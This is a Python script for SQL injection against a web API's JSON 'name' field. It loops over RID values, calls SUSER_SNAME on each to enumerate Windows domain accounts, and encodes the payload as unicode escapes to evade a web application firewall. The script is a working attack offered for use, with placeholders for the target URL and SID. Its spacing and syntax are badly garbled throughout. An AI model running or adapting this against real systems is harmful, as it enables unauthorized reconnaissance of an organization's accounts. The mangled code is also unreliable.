

#! / usr / bin / env python

import requests
import re
import json
import time
from termcolor import colored

def little (s):
    try:
        t = bytearray.fromhex (s)
        t.reverse ()
        return "" .join (format (x, "02x") for x in t) .upper ()
    except:
        print colored ("[i] Finished, Domain Accounts are over", "blue")
        exit (0)

if __name__ == "__main__":
    i = 1100
    SID = "0x0105000000000005150000001C00D1BCD181F1492BDFC236" #change this to your Security Identifier

    URL = "http://example.com/api/getColleagues" #change this to your URL


    print colored ("\ n \ t + ------------------------------------------ ---------------------------- + "," magenta ")
    print colored ("\ t | |", "yellow")
    print colored ("\ t | Enumerating Script For Domain Accounts |", "yellow")
    print colored ("\ t | SID:" + SID + "|", "yellow")
    print colored ("\ t | |", "yellow")
    print colored ("\ t + -------------------------------------------- -------------------------- + \ n \ n "," magenta ")

    for x in range (1100,6100,1000):
        for i in range (15):
            JUNK = "0" + hex ((x + i)) [2:]. Upper ()
            RID = SID + little (JUNK) + 4 * "0"
            payload = "- 'union select 1,2,3,4, SUSER_SNAME ({}) - -". format (RID)
            #payload = raw_input ("Enter Payload:")
            pattern = re.compile (r "([0-9a-f] {2})")
            encpyload = pattern.sub (r "\\ u00 \ 1", payload.encode ("hex"))
            r = requests.post (URL, data = '{"name": "' + encpyload + '"}', headers = {"Content-Type": "application / json; charset = utf-8"})
            if "403 - Forbidden: Access is denied." in r.text:
                print colored ("[-] Sleeping until WAF cooldown", "red")
                time.sleep (10)
                continue
            if "\\" in r.text:
                print colored ("[i] Counter:" + format ((x + i)), "blue")
                print colored ("[+] RID:" + format (RID), "green")
                print colored ("[+] Pyload:" + payload, "green")
                #print colored ("[+] Encoded payload:" + format (encpayload), "green")
                print colored ("\ n" + r.text, "yellow")
 
            jsona = json.loads (r.text)
            if jsona:
                try:
                    for element in jsona:
                        del element [u "position"]
                        del element [u "id"]
                        del element [u "email"]
                        del element [u "name"]
                except TypeError:
                    del jsona [u "position"]
                    del jsona [u "id"]
                    del jsona [u "email"]
                    del jsona [u "name"]
                data = json.dumps (jsona, sort_keys = True, indent = 4)
                if "\\" in r.text:
                    print colored (data + "\ n", "yellow")
            i + = 1


